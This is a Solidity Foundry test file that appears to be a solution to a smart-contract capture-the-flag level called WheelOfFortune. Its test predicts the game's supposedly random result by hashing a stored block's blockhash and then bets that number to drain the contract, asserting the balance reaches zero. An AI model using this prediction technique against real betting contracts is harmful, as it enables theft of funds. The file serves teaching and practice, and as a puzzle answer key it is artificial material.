// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "../src/03_WheelOfFortune/WheelOfFortune.sol";

// forge test --match-contract WheelOfFortuneTest -vvvv
contract WheelOfFortuneTest is BaseTest {
    WheelOfFortune instance;

    function setUp() public override {
        super.setUp();
        instance = new WheelOfFortune{value: 0.01 ether}();
        vm.deal(user1, 0.02 ether);
        vm.roll(48743985);
    }

    function testExploitLevel() public {
        vm.prank(user1);
        instance.spin{value: 0.01 ether}(1);

        (, , , uint256 blockNumber) = instance.games(0);

        uint256 predictedNumber = uint256(
            keccak256(abi.encode(blockhash(blockNumber)))
        ) % 100;

        console.log("Predicted block number (gameId = 0):", blockNumber);
        console.log("Predicted number (gameId = 0):", predictedNumber);

        instance.spin{value: 0.01 ether}(predictedNumber);
        instance.spin{value: 0.01 ether}(predictedNumber); // same blockhash for same user

        /*
        (, , , uint256 blockNumber1) = instance.games(1);

        uint256 predictedNumber1 = uint256(
            keccak256(abi.encode(blockhash(blockNumber1)))
        ) % 100;

        console.log("Predicted block number (gameId = 1):", blockNumber1);
        console.log("Predicted number (gameId = 1):", predictedNumber1);

        instance.spin{value: 0.01 ether}(predictedNumber1);
        */

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(
            address(instance).balance == 0,
            "Solution is not solving the level"
        );
    }
}
